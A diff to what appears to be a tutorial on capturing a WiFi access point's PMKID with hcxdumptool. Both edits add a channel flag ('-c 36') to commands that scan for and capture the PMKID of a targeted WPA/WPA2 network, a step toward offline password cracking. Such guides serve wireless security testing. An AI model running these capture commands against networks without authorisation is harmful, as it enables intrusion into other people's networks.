@@ -33,13 +33,13 @@ The target AP should be Wifi5 with WPA/WPA2.  Once you get the mac address of th
 To make sure the target AP is in the range of the attack.  CTRL-c to quit.
 
 ```bash
-sudo hcxdumptool -o ap.pcapng -i wlan0 --filterlist=ap.txt --filtermode=2 --do_rcascan
+sudo hcxdumptool -o ap.pcapng -i wlan0 --filterlist=ap.txt --filtermode=2 --do_rcascan -c 36
 ```
 
 When every thing is ready, we can scan the PMKID now.
 
 ```bash
-sudo hcxdumptool -o ap.pcapng -i wlan0 --filterlist=ap.txt --filtermode=2 --enable_status=3
+sudo hcxdumptool -o ap.pcapng -i wlan0 --filterlist=ap.txt --filtermode=2 --enable_status=3 -c 36
 ```
 
 When you see ```[FOUND PMKID]```, you can quit it with CTRL-c.
